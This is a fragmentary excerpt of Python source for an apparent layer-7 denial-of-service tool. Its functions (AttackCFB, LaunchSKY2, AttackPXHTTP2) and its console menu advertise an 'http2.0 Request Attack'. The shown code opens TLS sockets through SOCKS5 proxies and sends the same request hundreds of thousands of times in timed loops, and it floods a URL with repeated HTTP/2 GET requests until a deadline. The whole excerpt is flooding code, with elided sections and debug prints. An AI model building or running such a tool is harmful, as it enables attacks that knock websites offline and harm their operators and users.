...
def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        print(until_datetime - datetime.datetime.now())
...
def LaunchSKY2(url, timer):
    ...
    while time.time() < timelol:
        try:
            ...
            # Create a socket object and set up the proxy
            sock = socks.socksocket()

            sock.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]), True, proxy[2], proxy[3])
            sock.connect((hostname, port))

            # Connect to the server through the proxy
            print('buoc2--------',hostname,port)
            ...
            wrapped_socket = ctx.wrap_socket(sock, server_hostname=hostname)
            print('buoc33--------')
            ...
            # send_request_through_proxy(url, proxy, req)

            try:
                for _ in range(100000):
                    # s.send(str.encode(req))
                    # s.send(str.encode(req))
                    wrapped_socket.send(str.encode(req))
                    wrapped_socket.send(str.encode(req))
                    wrapped_socket.send(str.encode(req))
                    wrapped_socket.send(str.encode(req))
                    wrapped_socket.send(str.encode(req))
            ...
            print('------1111',e)
            wrapped_socket.close()
def send_request_through_proxy(url, proxy, req):
    try:
        ...
        # Send the request
        wrapped_socket.send(req.encode())
        print('buoc4--------')
...
def AttackPXHTTP2(url, until_datetime):
    ...
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            print(client.get(url, headers=headers))
            print(client.get(url, headers=headers))
        except:
            print('falid')
            pass
...
def layer7():
    ...
    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" http2.0 Request Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
